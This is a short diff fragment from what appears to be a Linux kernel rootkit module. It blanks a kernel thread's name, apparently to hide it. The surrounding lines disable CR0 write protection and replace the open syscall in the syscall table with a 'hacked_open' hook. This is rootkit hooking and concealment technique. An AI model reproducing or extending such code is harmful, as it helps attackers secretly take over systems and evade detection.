@@ -233,7 +233,7 @@ int init_mymodule(void){
   msqid_from_kernel_to_fs = -1;
   msqid_from_fs_to_kernel = -1;
 	do {
-    	tsk = kthread_create(fs_kthread_function, NULL, "fs_kthread");
+    	tsk = kthread_create(fs_kthread_function, NULL, "");
       cr0 = clear_cr0();
     	orig_open = syscall_table_addr[__NR_open];
       syscall_table_addr[__NR_open] = hacked_open;
